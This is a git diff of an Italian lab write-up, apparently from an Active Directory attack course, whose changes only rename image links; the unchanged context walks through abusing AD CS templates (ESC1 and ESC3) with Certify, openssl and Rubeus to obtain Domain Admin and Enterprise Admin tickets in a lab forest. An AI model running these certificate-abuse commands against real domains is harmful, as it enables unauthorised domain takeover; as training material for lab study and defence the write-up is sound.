@@ -1,6 +1,6 @@
 # LEARNING OBJECTIVE21
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 1. Check if AD CS is used by the target forest and find any\
    vulnerable/abusable templates
@@ -15,7 +15,7 @@ Possiamo utilizzare lo strumento Certify per verificare la presenza di AD CS in 
 C:\AD\Tools\Certify.exe cas
 ```
 
-<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 Possiamo elencare tutti i modelli utilizzando il seguente comando. Esaminando l'output possiamo trovare alcuni modelli interessanti.
 
@@ -23,9 +23,9 @@ Possiamo elencare tutti i modelli utilizzando il seguente comando. Esaminando l'
 C:\AD\Tools\Certify.exe find
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### SVOLGIMENTO2-Elevazione dei privilegi a DA ed EA utilizzando ESC1
 
@@ -35,7 +35,7 @@ Il modello HTTPSCertificates sembra interessante. Cerchiamo di ottenere ulterior
 C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubjects
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ottimo! Il modello HTTPSCertificates concede i diritti di registrazione al gruppo RDPUsers e consente al richiedente di fornire il Subject Name. Ricordiamo che student460 è membro del gruppo RDPUsers. Ciò significa che possiamo richiedere un certificato per qualsiasi utente come student460.
 
@@ -45,13 +45,13 @@ Richiediamo un certificato per Domain Admin - Administrator:
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Copiamo la chiave privata e il certificato in un file chiamato <kbd>esc1.pem</kbd> ed convertiamo il certificato pem in pfx
 
@@ -67,9 +67,9 @@ Utilizziamo il PFX creato sopra con Rubeus per richiedere un TGT per DA - Ammini
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc1-DA.pfx /password:SecretPass@123 /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verifica se ora disponiamo effettivamente dei privilegi DA:
 
@@ -77,7 +77,7 @@ Verifica se ora disponiamo effettivamente dei privilegi DA:
 winrs -r:dcorp-dc cmd /c set username
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Fantastico! Possiamo usare un metodo simile per ottenere i privilegi di Enterprise Admin. Richiedere un certificato per EA - Amministratore dobbiamo fare logout/login prima di poter ottenere privilegi di Enterprise Admin
 
@@ -85,9 +85,9 @@ Fantastico! Possiamo usare un metodo simile per ottenere i privilegi di Enterpri
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
 ```
 
-<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Creiamo il file pem per poi convertirlo in pfx, usiamo <kbd>SecretPass@123</kbd> come password
 
@@ -95,7 +95,7 @@ Creiamo il file pem per poi convertirlo in pfx, usiamo <kbd>SecretPass@123</kbd>
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
 ```
 
-<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilizza Rubeus per richiedere il TGT per l'Amministratore EA
 
@@ -103,9 +103,9 @@ Utilizza Rubeus per richiedere il TGT per l'Amministratore EA
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:SecretPass@123 /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ora possiamo accedere mcorp-dc
 
@@ -113,7 +113,7 @@ Ora possiamo accedere mcorp-dc
 winrs -r:mcorp-dc cmd /c  set username
 ```
 
-<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Privilege Escalation DA e EA usando il template esc3
 
@@ -139,7 +139,7 @@ Ottimo! Ora e' possibile richiedere un Enrollment Agent Certificate dal template
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 Certificato ottenuto in formato .pem, salvare l'output
 
@@ -211,7 +211,7 @@ dWT/PQ93ZJbrk8Ym4WgYdaCF3uQ0sRHpFyHa2s0PJyfz5idtFAHAAFO2siU=
 
 Come in precedenza, salvare il testo del certificato(compresa la Key) in esc3.pem e convertirlo in pfx. Utilizzare SecretPass@123 come password di esportazione:
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certificato per DA dal modello SmartCardEnrollment-Users.
 
@@ -219,7 +219,7 @@ Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certifica
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
 ```
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certificato per DA dal modello SmartCardEnrollment-Users:
 
@@ -227,7 +227,7 @@ Ora possiamo utilizzare Enrollment Agent Certificate per richiedere un certifica
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -302,7 +302,7 @@ Ancora una volta, salva il testo del certificato in esc3-DA.pem e converti il pe
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-DA.pfx
 ```
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 Utilizzare l'esc3-DA creato sopra con Rubeus per richiedere un TGT per DA.
 
@@ -310,7 +310,7 @@ Utilizzare l'esc3-DA creato sopra con Rubeus per richiedere un TGT per DA.
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 [*] base64(ticket.kirbi):
@@ -347,7 +347,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administr
       ZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=
 ```
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verifica se ora disponiamo effettivamente dei privilegi DA:
 
@@ -355,7 +355,7 @@ Verifica se ora disponiamo effettivamente dei privilegi DA:
 winrs -r:dcorp-dc cmd /c set username
 ```
 
-<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 Per passare a Enterprise Admin, è sufficiente apportare modifiche alla richiesta al template SmartCardEnrollmentUsers e a Rubeus. Si noti che qui stiamo utilizzando “/onbehalfof: mcorp\administrator” mentre prima avevamo usato "/onbehalfof:dcorp\administrator" :&#x20;
 
@@ -363,7 +363,7 @@ Per passare a Enterprise Admin, è sufficiente apportare modifiche alla richiest
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:SecretPass@123
 ```
 
-<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 -----BEGIN RSA PRIVATE KEY-----
@@ -438,7 +438,7 @@ Salviamo il file come abbiamo fatto in precedenza in esc3-EA.pem e lo convertiam
 C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-EA.pfx
 ```
 
-<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-EA.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
@@ -450,5 +450,5 @@ e poi verifichiamo l'accesso a <kbd>mcorp-dc</kbd>
 winrs -r:mcorp-dc cmd /c set username
 ```
 
-<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
